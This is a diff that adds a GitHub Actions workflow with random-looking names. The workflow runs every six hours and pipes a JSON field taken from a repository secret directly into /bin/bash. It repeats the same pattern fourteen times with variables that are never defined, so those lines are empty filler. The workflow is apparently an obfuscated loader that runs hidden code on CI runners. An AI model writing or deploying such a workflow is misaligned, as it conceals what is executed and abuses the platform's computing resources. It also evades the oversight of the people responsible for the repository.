@@ -1,0 +1,31 @@
+name: qichnbashipinda
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '4 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: qichnbashipinda
+        env:
+          notph78878: ${{ secrets.notph78878 }}
+        run: |
+          echo $notph78878 | jq -r .ctqyh03 | /bin/bash
+          echo $smvvo115 | jq -r .zgmpr31 | /bin/bash
+          echo $of1 | jq -r .olg081 | /bin/bash
+          echo $u95251 | jq -r .bzcu7 | /bin/bash
+          echo $g6 | jq -r .flz01642 | /bin/bash
+          echo $ctyvw2614 | jq -r .qv16486 | /bin/bash
+          echo $gu13359 | jq -r .l95 | /bin/bash
+          echo $vsqo48459 | jq -r .nxpi5868 | /bin/bash
+          echo $vyfl74956 | jq -r .y84 | /bin/bash
+          echo $r34361 | jq -r .pvs62 | /bin/bash
+          echo $tq433 | jq -r .cmpkd0 | /bin/bash
+          echo $nrom73 | jq -r .m845 | /bin/bash
+          echo $fdhb55 | jq -r .jllr43 | /bin/bash
+          echo $i7999 | jq -r .evfzv59464 | /bin/bash
+          echo $ltzhm7994 | jq -r .w20388 | /bin/bash
+
